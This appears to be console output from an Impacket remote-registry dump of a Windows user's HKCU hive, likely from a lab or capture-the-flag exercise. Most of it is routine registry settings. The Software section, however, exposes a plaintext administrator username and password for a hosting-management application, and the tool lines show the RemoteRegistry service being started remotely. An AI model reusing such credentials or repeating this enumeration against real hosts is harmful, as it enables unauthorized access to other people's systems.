        ScrollHeight    REG_SZ   -255
        ScrollWidth     REG_SZ   -255
        Shell Icon Size REG_SZ   32
        SmCaptionFont   REG_BINARY       
        0000   F4 FF FF FF 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0010   90 01 00 00 00 00 00 01  00 00 05 00 53 00 65 00   ............S.e.
        0020   67 00 6F 00 65 00 20 00  55 00 49 00 00 00 00 00   g.o.e. .U.I.....
        0030   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0040   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0050   00 00 00 00 00 00 00 00  00 00 00 00               ............
        SmCaptionHeight REG_SZ   -330
        SmCaptionWidth  REG_SZ   -330
        StatusFont      REG_BINARY       
        0000   F4 FF FF FF 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0010   90 01 00 00 00 00 00 01  00 00 05 00 53 00 65 00   ............S.e.
        0020   67 00 6F 00 65 00 20 00  55 00 49 00 00 00 00 00   g.o.e. .U.I.....
        0030   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0040   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0050   00 00 00 00 00 00 00 00  00 00 00 00               ............
        PaddedBorderWidth       REG_SZ   -60
        AppliedDPI      REG_DWORD        0x60
        MinAnimate      REG_SZ   0
Control Panel\Desktop\MuiCached\
        MachinePreferredUILanguages     REG_MULTI_SZ     en-U
Control Panel\Input Method\
        Show Status     REG_SZ   1
Control Panel\Input Method\Hot Keys\
Control Panel\Input Method\Hot Keys\00000010\
        Key Modifiers   REG_BINARY       
        0000   02 C0 00 00                                        ....
        Target IME      REG_BINARY       
        0000   00 00 00 00                                        ....
        Virtual Key     REG_BINARY       
        0000   20 00 00 00                                         ...
Control Panel\Input Method\Hot Keys\00000011\
        Key Modifiers   REG_BINARY       
        0000   04 C0 00 00                                        ....
        Target IME      REG_BINARY       
        0000   00 00 00 00                                        ....
        Virtual Key     REG_BINARY       
        0000   20 00 00 00                                         ...
Control Panel\Input Method\Hot Keys\00000012\
        Key Modifiers   REG_BINARY       
        0000   02 C0 00 00                                        ....
        Target IME      REG_BINARY       
        0000   00 00 00 00                                        ....
        Virtual Key     REG_BINARY       
        0000   BE 00 00 00                                        ....
Control Panel\Input Method\Hot Keys\00000070\
        Key Modifiers   REG_BINARY       
        0000   02 C0 00 00                                        ....
        Target IME      REG_BINARY       
        0000   00 00 00 00                                        ....
        Virtual Key     REG_BINARY       
        0000   20 00 00 00                                         ...
Control Panel\Input Method\Hot Keys\00000071\
        Key Modifiers   REG_BINARY       
        0000   04 C0 00 00                                        ....
        Target IME      REG_BINARY       
        0000   00 00 00 00                                        ....
        Virtual Key     REG_BINARY       
        0000   20 00 00 00                                         ...
Control Panel\Input Method\Hot Keys\00000072\
        Key Modifiers   REG_BINARY       
        0000   03 C0 00 00                                        ....
        Target IME      REG_BINARY       
        0000   00 00 00 00                                        ....
        Virtual Key     REG_BINARY       
        0000   BC 00 00 00                                        ....
Control Panel\Input Method\Hot Keys\00000104\
        Key Modifiers   REG_BINARY       
        0000   06 C0 00 00                                        ....
        Target IME      REG_BINARY       
        0000   11 04 01 E0                                        ....
        Virtual Key     REG_BINARY       
        0000   30 00 00 00                                        0...
Control Panel\Input Method\Hot Keys\00000200\
        Key Modifiers   REG_BINARY       
        0000   03 C0 00 00                                        ....
        Target IME      REG_BINARY       
        0000   00 00 00 00                                        ....
        Virtual Key     REG_BINARY       
        0000   47 00 00 00                                        G...
Control Panel\Input Method\Hot Keys\00000201\
        Key Modifiers   REG_BINARY       
        0000   03 C0 00 00                                        ....
        Target IME      REG_BINARY       
        0000   00 00 00 00                                        ....
        Virtual Key     REG_BINARY       
        0000   4B 00 00 00                                        K...
Control Panel\Input Method\Hot Keys\00000202\
        Key Modifiers   REG_BINARY       
        0000   03 C0 00 00                                        ....
        Target IME      REG_BINARY       
        0000   00 00 00 00                                        ....
        Virtual Key     REG_BINARY       
        0000   4C 00 00 00                                        L...
Control Panel\Input Method\Hot Keys\00000203\
        Key Modifiers   REG_BINARY       
        0000   03 C0 00 00                                        ....
        Target IME      REG_BINARY       
        0000   00 00 00 00                                        ....
        Virtual Key     REG_BINARY       
        0000   56 00 00 00                                        V...
Control Panel\International\
        Locale  REG_SZ   00000409
        LocaleName      REG_SZ   en-US
        s1159   REG_SZ   AM
        s2359   REG_SZ   PM
        sCountry        REG_SZ   United States
        sCurrency       REG_SZ   $
        sDate   REG_SZ   /
        sDecimal        REG_SZ   .
        sGrouping       REG_SZ   3;0
        sLanguage       REG_SZ   ENU
        sList   REG_SZ   ,
        sLongDate       REG_SZ   dddd, MMMM d, yyyy
        sMonDecimalSep  REG_SZ   .
        sMonGrouping    REG_SZ   3;0
        sMonThousandSep REG_SZ   ,
        sNativeDigits   REG_SZ   0123456789
        sNegativeSign   REG_SZ   -
        sPositiveSign   REG_SZ   
        sShortDate      REG_SZ   M/d/yyyy
        sThousand       REG_SZ   ,
        sTime   REG_SZ   :
        sTimeFormat     REG_SZ   h:mm:ss tt
        sShortTime      REG_SZ   h:mm tt
        sYearMonth      REG_SZ   MMMM yyyy
        iCalendarType   REG_SZ   1
        iCountry        REG_SZ   1
        iCurrDigits     REG_SZ   2
        iCurrency       REG_SZ   0
        iDate   REG_SZ   0
        iDigits REG_SZ   2
        NumShape        REG_SZ   1
        iFirstDayOfWeek REG_SZ   6
        iFirstWeekOfYear        REG_SZ   0
        iLZero  REG_SZ   1
        iMeasure        REG_SZ   1
        iNegCurr        REG_SZ   0
        iNegNumber      REG_SZ   1
        iPaperSize      REG_SZ   1
        iTime   REG_SZ   0
        iTimePrefix     REG_SZ   0
        iTLZero REG_SZ   0
Control Panel\International\Geo\
        Nation  REG_SZ   244
Control Panel\International\User Profile\
        Languages       REG_MULTI_SZ     en-U
        ShowAutoCorrection      REG_DWORD        0x1
        ShowTextPrediction      REG_DWORD        0x1
        ShowCasing      REG_DWORD        0x1
        ShowShiftLock   REG_DWORD        0x1
Control Panel\International\User Profile\en-US\
        0409:00000409   REG_DWORD        0x1
Control Panel\Keyboard\
        InitialKeyboardIndicators       REG_SZ   2
        KeyboardDelay   REG_SZ   1
        KeyboardSpeed   REG_SZ   31
Control Panel\Mouse\
        ActiveWindowTracking    REG_DWORD        0x0
        Beep    REG_SZ   No
        DoubleClickHeight       REG_SZ   4
        DoubleClickSpeed        REG_SZ   500
        DoubleClickWidth        REG_SZ   4
        ExtendedSounds  REG_SZ   No
        MouseHoverHeight        REG_SZ   4
        MouseHoverTime  REG_SZ   400
        MouseHoverWidth REG_SZ   4
        MouseSensitivity        REG_SZ   10
        MouseSpeed      REG_SZ   1
        MouseThreshold1 REG_SZ   6
        MouseThreshold2 REG_SZ   10
        MouseTrails     REG_SZ   0
        SmoothMouseXCurve       REG_BINARY       
        0000   00 00 00 00 00 00 00 00  15 6E 00 00 00 00 00 00   .........n......
        0010   00 40 01 00 00 00 00 00  29 DC 03 00 00 00 00 00   .@......).......
        0020   00 00 28 00 00 00 00 00                            ..(.....
        SmoothMouseYCurve       REG_BINARY       
        0000   00 00 00 00 00 00 00 00  FD 11 01 00 00 00 00 00   ................
        0010   00 24 04 00 00 00 00 00  00 FC 12 00 00 00 00 00   .$..............
        0020   00 C0 BB 01 00 00 00 00                            ........
        SnapToDefaultButton     REG_SZ   0
        SwapMouseButtons        REG_SZ   0
Control Panel\PowerCfg\
        CurrentPowerPolicy      REG_SZ   0
Control Panel\PowerCfg\GlobalPowerPolicy\
        Policies        REG_BINARY       
        0000   01 00 00 00 00 00 00 00  03 00 00 00 10 00 00 00   ................
        0010   00 00 00 00 03 00 00 00  10 00 00 00 02 00 00 00   ................
        0020   03 00 00 00 00 00 00 00  02 00 00 00 03 00 00 00   ................
        0030   00 00 00 00 02 00 00 00  01 00 00 00 00 00 00 00   ................
        0040   02 00 00 00 01 00 00 00  00 00 00 00 01 00 00 00   ................
        0050   03 00 00 00 03 00 00 00  00 00 00 C0 01 00 00 00   ................
        0060   05 00 00 00 01 00 00 00  0A 00 00 00 00 00 00 00   ................
        0070   03 00 00 00 01 00 00 00  01 00 00 00 00 00 00 00   ................
        0080   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0090   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        00a0   00 00 00 00 00 00 00 00  00 00 00 00 16 00 00 00   ................
Control Panel\PowerCfg\PowerPolicies\
Control Panel\PowerCfg\PowerPolicies\0\
        Description     REG_SZ   This scheme is suited to most home or desktop computers that are left plugged in all the time.
        Name    REG_SZ   Home/Office Desk
        Policies        REG_BINARY       
        0000   01 00 00 00 02 00 00 00  01 00 00 00 00 00 00 00   ................
        0010   02 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0020   2C 01 00 00 32 32 00 03  04 00 00 00 04 00 00 00   ,...22..........
        0030   00 00 00 00 00 00 00 00  B0 04 00 00 2C 01 00 00   ............,...
        0040   00 00 00 00 58 02 00 00  01 01 64 50 64 64 00 00   ....X.....dPdd..
Control Panel\PowerCfg\PowerPolicies\1\
        Description     REG_SZ   This scheme is designed for extended battery life for portable computers on the road.
        Name    REG_SZ   Portable/Laptop
        Policies        REG_BINARY       
        0000   01 00 00 00 02 00 00 00  01 00 00 00 00 00 00 00   ................
        0010   02 00 00 00 01 00 00 00  00 00 00 00 B0 04 00 00   ................
        0020   2C 01 00 00 32 32 03 03  04 00 00 00 04 00 00 00   ,...22..........
        0030   00 00 00 00 00 00 00 00  84 03 00 00 2C 01 00 00   ............,...
        0040   08 07 00 00 2C 01 00 00  01 01 64 50 64 64 00 00   ....,.....dPdd..
Control Panel\PowerCfg\PowerPolicies\2\
        Description     REG_SZ   This scheme keeps the monitor on for doing presentations.
        Name    REG_SZ   Presentation
        Policies        REG_BINARY       
        0000   01 00 00 00 02 00 00 00  01 00 00 00 00 00 00 00   ................
        0010   02 00 00 00 01 00 00 00  00 00 00 00 00 00 00 00   ................
        0020   84 03 00 00 32 32 03 02  04 00 00 00 04 00 00 00   ....22..........
        0030   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0040   00 00 00 00 2C 01 00 00  01 01 50 50 64 64 00 00   ....,.....PPdd..
Control Panel\PowerCfg\PowerPolicies\3\
        Description     REG_SZ   This scheme keeps the computer running so that it can be accessed from the network.  Use this scheme if you do not have network wakeup hardware.
        Name    REG_SZ   Always On
        Policies        REG_BINARY       
        0000   01 00 00 00 02 00 00 00  01 00 00 00 00 00 00 00   ................
        0010   02 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0020   00 00 00 00 32 32 00 00  04 00 00 00 04 00 00 00   ....22..........
        0030   00 00 00 00 00 00 00 00  B0 04 00 00 84 03 00 00   ................
        0040   00 00 00 00 08 07 00 00  00 01 64 64 64 64 00 00   ..........dddd..
Control Panel\PowerCfg\PowerPolicies\4\
        Description     REG_SZ   This scheme keeps the computer on and optimizes it for high performance.
        Name    REG_SZ   Minimal Power Management
        Policies        REG_BINARY       
        0000   01 00 00 00 02 00 00 00  01 00 00 00 00 00 00 00   ................
        0010   02 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0020   2C 01 00 00 32 32 03 03  04 00 00 00 04 00 00 00   ,...22..........
        0030   00 00 00 00 00 00 00 00  84 03 00 00 2C 01 00 00   ............,...
        0040   00 00 00 00 84 03 00 00  00 01 64 64 64 64 00 00   ..........dddd..
Control Panel\PowerCfg\PowerPolicies\5\
        Description     REG_SZ   This scheme is extremely aggressive for saving power.
        Name    REG_SZ   Max Battery
        Policies        REG_BINARY       
        0000   01 00 00 00 02 00 00 00  01 00 00 00 00 00 00 00   ................
        0010   02 00 00 00 05 00 00 00  00 00 00 00 B0 04 00 00   ................
        0020   78 00 00 00 32 32 03 02  04 00 00 00 04 00 00 00   x...22..........
        0030   00 00 00 00 00 00 00 00  84 03 00 00 3C 00 00 00   ............<...
        0040   00 00 00 00 B4 00 00 00  01 01 64 32 64 64 00 00   ..........d2dd..
[+] Saved → ./hkcu_dump/HKCU__Control_Panel.txt
──────────────────────────────────────────────────
[*] Querying: HKCU\Environment
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[+] Saved → ./hkcu_dump/HKCU__Environment.txt
──────────────────────────────────────────────────
[*] Querying: HKCU\Keyboard Layout
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
Keyboard Layout\Preload\
        1       REG_SZ   00000409
Keyboard Layout\Substitutes\
Keyboard Layout\Toggle\
[+] Saved → ./hkcu_dump/HKCU__Keyboard_Layout.txt
──────────────────────────────────────────────────
[*] Querying: HKCU\Network
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[+] Saved → ./hkcu_dump/HKCU__Network.txt
──────────────────────────────────────────────────
[*] Querying: HKCU\Software
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
^FSoftware\GiganticHostingManagementSystem\
        UserName        REG_SZ   henry.vinson_adm
        PassWord        REG_SZ   G1#Ny5@2dvht
Software\Microsoft\
Software\Microsoft\Active Setup\
Software\Microsoft\Active Setup\Installed Components\
Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}\
        Version REG_SZ   10,0,14393,4283
        Locale  REG_SZ   en
Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}\
Software\Microsoft\Command Processor\
        CompletionChar  REG_DWORD        0x9
        DefaultColor    REG_DWORD        0x0
        EnableExtensions        REG_DWORD        0x1
        PathCompletionChar      REG_DWORD        0x9
Software\Microsoft\CTF\
Software\Microsoft\CTF\Assemblies\
Software\Microsoft\CTF\Assemblies\0x00000409\
Software\Microsoft\CTF\Assemblies\0x00000409\{34745C63-B2F0-4784-8B67-5E12C8701A31}\
        Default REG_SZ   {00000000-0000-0000-0000-000000000000}
        Profile REG_SZ   {00000000-0000-0000-0000-000000000000}
        KeyboardLayout  REG_DWORD        0x4090409
Software\Microsoft\CTF\DirectSwitchHotkeys\
Software\Microsoft\CTF\HiddenDummyLayouts\
Software\Microsoft\CTF\SortOrder\
Software\Microsoft\CTF\SortOrder\AssemblyItem\
Software\Microsoft\CTF\SortOrder\AssemblyItem\0x00000409\
Software\Microsoft\CTF\SortOrder\AssemblyItem\0x00000409\{34745C63-B2F0-4784-8B67-5E12C8701A31}\
Software\Microsoft\CTF\SortOrder\AssemblyItem\0x00000409\{34745C63-B2F0-4784-8B67-5E12C8701A31}\00000000\
        CLSID   REG_SZ   {00000000-0000-0000-0000-000000000000}
        KeyboardLayout  REG_DWORD        0x4090409
        Profile REG_SZ   {00000000-0000-0000-0000-000000000000}
Software\Microsoft\CTF\SortOrder\Language\
        00000000        REG_SZ   00000409
Software\Microsoft\CTF\TIP\
Software\Microsoft\EventSystem\
Software\Microsoft\EventSystem\{26c409cc-ae86-11d1-b616-00805fc79216}\
Software\Microsoft\FTP\
        Use PASV        REG_SZ   yes
Software\Microsoft\Internet Explorer\
Software\Microsoft\Internet Explorer\TabbedBrowsing\
        TabsStickyMode  REG_DWORD        0x1
Software\Microsoft\Internet Explorer\TypedURLs\
Software\Microsoft\Notepad\
        iWindowPosX     REG_DWORD        0xa0
        iWindowPosY     REG_DWORD        0xae
        iWindowPosDX    REG_DWORD        0x525
        iWindowPosDY    REG_DWORD        0x1c9
Software\Microsoft\Speech\
Software\Microsoft\Speech Virtual\
Software\Microsoft\Speech_OneCore\
Software\Microsoft\SystemCertificates\
Software\Microsoft\SystemCertificates\ACRS\
Software\Microsoft\SystemCertificates\ACRS\PhysicalStores\
Software\Microsoft\SystemCertificates\ACRS\PhysicalStores\.LocalMachine\
        OpenStoreProvider       REG_SZ   #0
        OpenEncodingType        REG_DWORD        0x0
        OpenFlags       REG_DWORD        0x0
        OpenParameters  REG_BINARY       
        Flags   REG_DWORD        0x2
        Priority        REG_DWORD        0x0
Software\Microsoft\SystemCertificates\AuthRoot\
Software\Microsoft\SystemCertificates\AuthRoot\AutoUpdate\
        DisallowedCertLastSyncTime      REG_BINARY       
        0000   E3 72 E7 7D 3D AC D6 01                            .r.}=...
Software\Microsoft\SystemCertificates\CA\
Software\Microsoft\SystemCertificates\CA\Certificates\
Software\Microsoft\SystemCertificates\CA\CRLs\
Software\Microsoft\SystemCertificates\CA\CTLs\
Software\Microsoft\SystemCertificates\Disallowed\
Software\Microsoft\SystemCertificates\Disallowed\Certificates\
Software\Microsoft\SystemCertificates\Disallowed\CRLs\
Software\Microsoft\SystemCertificates\Disallowed\CTLs\
Software\Microsoft\SystemCertificates\MY\
Software\Microsoft\SystemCertificates\Root\
Software\Microsoft\SystemCertificates\Root\Certificates\
Software\Microsoft\SystemCertificates\Root\CRLs\
Software\Microsoft\SystemCertificates\Root\CTLs\
Software\Microsoft\SystemCertificates\Root\ProtectedRoots\
        Certificates    REG_BINARY       
        0000   18 00 00 00 01 00 00 00  A0 92 75 AB 4B 92 D6 01   ..........u.K...
        0010   00 00 00 00 18 00 00 00                            ........
Software\Microsoft\SystemCertificates\SmartCardRoot\
Software\Microsoft\SystemCertificates\SmartCardRoot\Certificates\
Software\Microsoft\SystemCertificates\SmartCardRoot\CRLs\
Software\Microsoft\SystemCertificates\SmartCardRoot\CTLs\
Software\Microsoft\SystemCertificates\trust\
Software\Microsoft\SystemCertificates\trust\Certificates\
Software\Microsoft\SystemCertificates\trust\CRLs\
Software\Microsoft\SystemCertificates\trust\CTLs\
Software\Microsoft\SystemCertificates\TrustedPeople\
Software\Microsoft\SystemCertificates\TrustedPeople\Certificates\
Software\Microsoft\SystemCertificates\TrustedPeople\CRLs\
Software\Microsoft\SystemCertificates\TrustedPeople\CTLs\
Software\Microsoft\Windows\
Software\Microsoft\Windows\CurrentVersion\
Software\Microsoft\Windows\CurrentVersion\ApplicationAssociationToasts\
        AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.3g2       REG_DWORD        0x0
        AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.3g2       REG_DWORD        0x0
        AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.3g2       REG_DWORD        0x0
        AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.3gp       REG_DWORD        0x0
        AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.3gp       REG_DWORD        0x0
        AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.3gp       REG_DWORD        0x0
        AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.3gp2      REG_DWORD        0x0
        AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.3gpp      REG_DWORD        0x0
        AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.3gpp      REG_DWORD        0x0
        AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.3gpp      REG_DWORD        0x0
        AppX9v2an58zgtq78h18jgmp43b5gza6b2jp_.aac       REG_DWORD        0x0
        AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.aac       REG_DWORD        0x0
        AppX9v2an58zgtq78h18jgmp43b5gza6b2jp_.adt       REG_DWORD        0x0
        AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.adt       REG_DWORD        0x0
        AppX9v2an58zgtq78h18jgmp43b5gza6b2jp_.adts      REG_DWORD        0x0
        AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.adts      REG_DWORD        0x0
        AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.amr       REG_DWORD        0x0
        AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.arw       REG_DWORD        0x0
        WMP11.AssocFile.ASF_.asf        REG_DWORD        0x0
        AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.asf       REG_DWORD        0x0
        AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.avi       REG_DWORD        0x0
        AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.avi       REG_DWORD        0x0
        AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.avi       REG_DWORD        0x0
        AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.cr2       REG_DWORD        0x0
        AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.crw       REG_DWORD        0x0
        AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.divx      REG_DWORD        0x0
        docxfile_.docx  REG_DWORD        0x0
        AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.erf       REG_DWORD        0x0
        AppX9v2an58zgtq78h18jgmp43b5gza6b2jp_.flac      REG_DWORD        0x0
        AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.flac      REG_DWORD        0x0
        icofile_.ico    REG_DWORD        0x0
        PBrush_.ico     REG_DWORD        0x0
        AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.kdc       REG_DWORD        0x0
        WMP11.AssocFile.M2TS_.m2t       REG_DWORD        0x0
        AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.m2t       REG_DWORD        0x0
        AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.m2t       REG_DWORD        0x0
        AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.m2t       REG_DWORD        0x0
        WMP11.AssocFile.M2TS_.m2ts      REG_DWORD        0x0
        AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.m2ts      REG_DWORD        0x0
        AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.m2ts      REG_DWORD        0x0
        AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.m2ts      REG_DWORD        0x0
        WMP11.AssocFile.m3u_.m3u        REG_DWORD        0x0
        AppX9v2an58zgtq78h18jgmp43b5gza6b2jp_.m3u       REG_DWORD        0x0
        AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.m3u       REG_DWORD        0x0
        AppX5sy1gww9q4g2gt941cdxxd7s07xe5vph_.m4a       REG_DWORD        0x0
        AppX9v2an58zgtq78h18jgmp43b5gza6b2jp_.m4a       REG_DWORD        0x0
        AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.m4a       REG_DWORD        0x0
        AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.m4r       REG_DWORD        0x0
        AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.m4v       REG_DWORD        0x0
        AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.m4v       REG_DWORD        0x0
        AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.m4v       REG_DWORD        0x0
        WMP11.AssocFile.MKV_.mkv        REG_DWORD        0x0
        AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.mkv       REG_DWORD        0x0
        AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.mkv       REG_DWORD        0x0
        AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.mkv       REG_DWORD        0x0
        WMP11.AssocFile.MPEG_.mod       REG_DWORD        0x0
        AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.mod       REG_DWORD        0x0
        AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.mod       REG_DWORD        0x0
        AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.mov       REG_DWORD        0x0
        AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.mov       REG_DWORD        0x0
        AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.mov       REG_DWORD        0x0
        AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.mp2       REG_DWORD        0x0
        AppX9v2an58zgtq78h18jgmp43b5gza6b2jp_.mp3       REG_DWORD        0x0
        AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.mp3       REG_DWORD        0x0
        AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.mp4       REG_DWORD        0x0
        AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.mp4       REG_DWORD        0x0
        AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.mp4       REG_DWORD        0x0
        AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.mp4v      REG_DWORD        0x0
        AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.mp4v      REG_DWORD        0x0
        AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.mp4v      REG_DWORD        0x0
        AppX9v2an58zgtq78h18jgmp43b5gza6b2jp_.mpa       REG_DWORD        0x0
        AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.mpa       REG_DWORD        0x0
        AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.mpe       REG_DWORD        0x0
        AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.mpeg      REG_DWORD        0x0
        AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.mpg       REG_DWORD        0x0
        WMP11.AssocFile.MPEG_.mpv2      REG_DWORD        0x0
        AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.mpv2      REG_DWORD        0x0
        AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.mpv2      REG_DWORD        0x0
        AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.mrw       REG_DWORD        0x0
        AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.mts       REG_DWORD        0x0
        AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.mts       REG_DWORD        0x0
        AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.mts       REG_DWORD        0x0
        AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.nef       REG_DWORD        0x0
        AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.nrw       REG_DWORD        0x0
        odtfile_.odt    REG_DWORD        0x0
        AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.orf       REG_DWORD        0x0
        AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.pef       REG_DWORD        0x0
        AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.raf       REG_DWORD        0x0
        AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.raw       REG_DWORD        0x0
        rtffile_.rtf    REG_DWORD        0x0
        AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.rw2       REG_DWORD        0x0
        AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.rwl       REG_DWORD        0x0
        AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.sr2       REG_DWORD        0x0
        AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.srw       REG_DWORD        0x0
        AppX43hnxtbyyps62jhe9sqpdzxn1790zetc_.tif       REG_DWORD        0x0
        AppX86746z2101ayy2ygv3g96e4eqdf8r99j_.tif       REG_DWORD        0x0
        AppX43hnxtbyyps62jhe9sqpdzxn1790zetc_.tiff      REG_DWORD        0x0
        AppX86746z2101ayy2ygv3g96e4eqdf8r99j_.tiff      REG_DWORD        0x0
        AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.tod       REG_DWORD        0x0
        AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.ts        REG_DWORD        0x0
        AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.ts        REG_DWORD        0x0
        AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.tts       REG_DWORD        0x0
        AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.tts       REG_DWORD        0x0
        vcard_wab_auto_file_.vcf        REG_DWORD        0x0
        AppX9v2an58zgtq78h18jgmp43b5gza6b2jp_.wav       REG_DWORD        0x0
        AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.wav       REG_DWORD        0x0
        AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.wm        REG_DWORD        0x0
        AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.wm        REG_DWORD        0x0
        AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.wm        REG_DWORD        0x0
        AppX9v2an58zgtq78h18jgmp43b5gza6b2jp_.wma       REG_DWORD        0x0
        AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.wma       REG_DWORD        0x0
        AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.wmv       REG_DWORD        0x0
        AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.wmv       REG_DWORD        0x0
        AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.wmv       REG_DWORD        0x0
        AppX9v2an58zgtq78h18jgmp43b5gza6b2jp_.wpl       REG_DWORD        0x0
        AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.wpl       REG_DWORD        0x0
        AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.xvid      REG_DWORD        0x0
        AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.xvid      REG_DWORD        0x0
        AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.zpl       REG_DWORD        0x0
        AppX9v2an58zgtq78h18jgmp43b5gza6b2jp_.zpl       REG_DWORD        0x0
        AppXtggqqtcfspt6ks3fjzyfppwc05yxwtwy_mswindowsmusic     REG_DWORD        0x0
        AppX6w6n4f8xch1s3vzwf3af6bfe88qhxbza_mswindowsvideo     REG_DWORD        0x0
        Applications\Notepad.exe_.css   REG_DWORD        0x0
        Applications\Notepad.exe_.csv   REG_DWORD        0x0
        inffile_.inf    REG_DWORD        0x0
        inifile_.ini    REG_DWORD        0x0
        Windows.IsoFile_.iso    REG_DWORD        0x0
        JSFile_.js      REG_DWORD        0x0
        txtfile_.log    REG_DWORD        0x0
        regfile_.reg    REG_DWORD        0x0
        txtfile_.txt    REG_DWORD        0x0
